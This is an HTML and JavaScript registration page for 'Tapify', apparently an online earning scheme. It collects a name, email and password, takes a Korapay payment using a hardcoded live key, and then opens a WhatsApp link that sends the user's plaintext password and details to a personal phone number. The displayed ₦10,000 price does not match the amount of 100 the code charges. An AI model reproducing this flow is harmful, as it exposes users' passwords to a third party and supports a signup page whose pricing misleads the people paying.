<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Tapify registration</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #f9f6f2; /* Light beige */
      color: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }
    .container {
      background-color: #fff;
      padding: 2rem;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 420px;
      text-align: left;
    }
    .logo {
      width: 120px;
      margin-bottom: 1rem;
    }
    h2 {
      color: #8b4513; /* Rich brown */
      margin-bottom: 0.5rem;
    }
    p.subtitle {
      color: #8b4513;
      margin-bottom: 1.5rem;
      font-size: 0.95rem;
    }
    label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 600;
      color: #000;
    }
    input {
      width: 100%;
      padding: 0.75rem;
      margin-bottom: 1.25rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      background-color: #f5f5f5;
      color: #333;
      font-size: 1rem;
    }
    input::placeholder {
      color: #888;
    }
    .coupon {
      margin-bottom: 1rem;
    }
    .coupon label {
      color: #000;
    }
    .coupon input {
      background-color: #f5f5f5;
      color: #555;
    }
    .plan {
      background-color: #fff8f0;
      border: 2px dashed #ffa500;
      border-radius: 10px;
      padding: 1rem;
      margin-bottom: 1.5rem;
    }
    .plan h3 {
      margin: 0;
      font-size: 1.1rem;
      color: #8b4513;
    }
    .plan p {
      margin: 0.5rem 0 0;
      font-size: 0.9rem;
      color: #333;
    }
    button {
      width: 100%;
      padding: 0.75rem;
      background-color: #ffa500; /* Orange */
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
    }
    button:hover {
      background-color: #e69500;
    }
    .note {
      font-size: 0.8rem;
      color: #666;
      margin-top: 1rem;
      text-align: center;
    }
  </style>
</head>
<body>

  <div class="container">
    <img src="https://i.ibb.co/39fcLR0M/Tapify-20250926-124356-0000-removebg-preview.png" alt="Tapify Logo" class="logo" />
    <h2>Create Your Account</h2>
    <p class="subtitle">Join Tapify and start your earning journey!</p>

    <form id="registrationForm">
      <label for="name">Full Name</label>
      <input type="text" id="name" name="name" placeholder="Your full name" required />

      <label for="email">Email Address</label>
      <input type="email" id="email" name="email" placeholder="you@email.com" required />

      <label for="password">Password</label>
      <input type="password" id="password" name="password" placeholder="Create a password" required />

      <div class="coupon">
        <label for="coupon">Coupon Code</label>
        <input type="text" id="coupon" name="coupon" placeholder="Coupon code would be automatically" readonly />
      </div>

      <div class="plan">
        <h3>Premium Plan – ₦10,000</h3>
        <p><del>₦12,500</del> <span style="color:#8b4513;">25% OFF</span></p>
      </div>

      <button type="submit">Sign Up</button>
    </form>

    <div class="note">Secure registration | SSL protected</div>
  </div>

  <!-- Kora Inline Payment Script -->
<script src="https://korablobstorage.blob.core.windows.net/modal-bucket/korapay-collections.min.js"></script>
<script>
  document.addEventListener('DOMContentLoaded', () => {
    document.getElementById('registrationForm').addEventListener('submit', function(e) {
      e.preventDefault();

      const name = this.name.value.trim();
      const email = this.email.value.trim();
      const password = this.password.value.trim();
      const coupon = document.getElementById('coupon').value.trim();

      if (!name || !email || !password) {
        alert('Please fill out all fields.');
        return;
      }

      if (typeof Korapay === 'undefined') {
        alert('Payment service is unavailable. Please try again later.');
        return;
      }

      window.Korapay.initialize({
        key: 'pk_live_yRJ1XJRGy7hbDqp6P6YjrjY9fargo1LiHgQJrefZ', // Replace with your actual public key
        reference: 'DENICFX-' + Date.now(),
        amount: 100,
        currency: 'NGN',
        customer: {
          name: name,
          email: email
        },
        onSuccess: () => {
          alert('Payment successful! Your registration details will be sent to the admin.');

          // Send details to WhatsApp DM
          const message = `New Registration:\nName: ${name}\nEmail: ${email}\nPassword: ${password}\nCoupon: ${coupon}`;
          window.open(`https://wa.me/2349123282989?text=${encodeURIComponent(message)}`, '_blank'); // Replace with your WhatsApp number
        },
        onClose: () => {
          alert('Payment was not completed. You’ve been returned to the registration page.');
          window.location.href = window.location.href; // Reloads the form page
        }
      });
    });
  });
</script>
</body>
</html>
